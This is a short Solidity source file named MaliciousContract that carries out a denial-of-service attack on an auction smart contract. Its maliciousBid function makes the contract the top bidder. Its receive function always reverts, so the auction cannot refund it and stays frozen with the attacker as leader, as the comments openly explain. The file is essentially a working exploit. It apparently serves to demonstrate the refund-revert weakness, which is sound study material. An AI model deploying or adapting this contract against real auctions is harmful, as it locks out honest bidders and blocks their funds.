// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

/**
 * @title MaliciousContract
 * @author Shakee Khan
 */



/**
 * The error to revert any transaction made to this contract.
 * In order to prevent any other user to become aution leader
 */
error MaliciousError();

contract MaliciousContract {
    // address public currentLeader;
    uint public highestBid;
    IAuction auction;

    constructor(address _auctionAddress) {
        auction = IAuction(_auctionAddress);
        highestBid = auction.highestBid();
    }

    function maliciousBid() external payable {
        // Checking for highest bid amount
        require(
            msg.value > highestBid,
            "Bid amount should be greater than the highest bid"
        );
        // Calling the bid() function of Auction Smart Contract for bidding.
        auction.bid{value: msg.value}();
    }

    /**
     * reveive() function will be invoked once a new bidder will call the bid() function
     * of Auction Smart Contract.
     */
    receive() external payable {
        /**
         * It will always revert and the payment will not be received in this smart contract.
         * This will make the "bid()" in the Auction smart contract to revert, which will result following:
         * 1- The previouse bidLeader will not get paid
         * 2- The "currentLeader" variable in the Auction smart contract will not be updated,
         * the previouse bid leader (our MaliciousContract) will remain the current big leader.
         * 3- The "highestBid" variable in the Auction smart contract will not be updated as well.
         */
        revert MaliciousError();
    }
}

/**
 * Interface of Auction Smart Contract to call its function "bid()"
 */
interface IAuction {
    /**
     * "bid()" of Auction Smart Contract.
     */

    // uint public highestBid;
    function bid() external payable;
    function highestBid() external returns(uint);
}
